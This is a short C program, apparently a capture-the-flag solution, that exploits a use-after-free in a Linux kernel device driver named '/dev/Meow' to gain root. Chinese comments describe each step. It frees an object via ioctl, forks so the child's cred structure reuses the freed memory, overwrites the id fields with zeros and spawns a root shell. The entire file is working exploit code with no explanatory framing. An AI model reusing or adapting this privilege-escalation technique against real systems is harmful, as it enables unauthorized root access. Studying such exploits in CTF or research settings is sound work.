#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
	// 打开两次设备
	int fd1 = open("/dev/Meow", 2);
	int fd2 = open("/dev/Meow", 2);

	// 修改me.len为cred size
	puts("[+] kfree kmalloc start.");
	ioctl(fd1, 0x4d656f77, 0xa8);

	close(fd1);

	// 新起进程的cred空间会和刚刚释放的struct Meow重叠
	int pid = fork();
	if(pid < 0)
	{
		puts("[*] fork error!");
		exit(0);
	}

	else if(pid == 0)
	{
		puts("[+] write start.");
		// 通过向 fd2 写入28个0，把新进程的cred的几个id都覆盖为0
		char zeros[100] = {0};
		write(fd2, zeros, 28);

		if(getuid() == 0)
		{
			puts("[+] get root!");
			system("/bin/sh");
			exit(0);
		}
	}
	
	else
	{
		wait(NULL);
	}
	close(fd2);

	return 0;
}
